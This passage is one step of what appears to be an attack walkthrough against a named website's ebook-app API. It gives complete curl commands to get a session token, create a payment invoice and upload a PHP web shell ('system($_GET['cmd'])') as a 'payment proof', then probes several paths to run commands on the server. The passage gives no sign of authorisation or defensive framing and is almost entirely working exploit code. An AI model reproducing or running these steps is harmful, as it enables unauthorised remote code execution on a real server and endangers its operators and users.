##  Step 6 – Remote Code Execution (RCE) via Payment Proof Upload

The endpoint upload_manual_payment_proof accepts file uploads. If the server stores them in a web‑accessible directory and executes PHP, you can get RCE.

### 6.1 Obtain a Session Token (Login)
TOKEN=$(curl -s -X POST "https://mangaindo.sobatfile.my.id/api/v1/api.php?api_key=$API_KEY" \
  -H "Data-Agent: Android Ebook App" \
  -d "action=user_login&email=attacker@test.com&password=Attacker123!" \
  | jq -r '.data.session_token')

### 6.2 Create an Invoice
INVOICE=$(curl -s -X POST "https://mangaindo.sobatfile.my.id/api/v1/api.php?api_key=$API_KEY" \
  -H "Data-Agent: Android Ebook App" \
  -d "action=create_manual_payment_invoice&user_session_token=$TOKEN&amount=10.00" \
  | jq -r '.data.invoice_no')

### 6.3 Upload a PHP Shell
Create shell.php with:
<?php system($_GET['cmd']); ?>

Upload:
curl -s -X POST "https://mangaindo.sobatfile.my.id/api/v1/api.php?api_key=$API_KEY" \
  -H "Data-Agent: Android Ebook App" \
  -F "action=upload_manual_payment_proof" \
  -F "user_session_token=$TOKEN" \
  -F "invoice_no=$INVOICE" \
  -F "proof=@shell.php"

### 6.4 Locate and Execute the Shell
Try common paths:
# Test each
curl -s "https://mangaindo.sobatfile.my.id/uploads/shell.php?cmd=id"
curl -s "https://mangaindo.sobatfile.my.id/proofs/shell.php?cmd=id"
curl -s "https://mangaindo.sobatfile.my.id/shell.php?cmd=id"

If any returns uid=..., you have RCE.

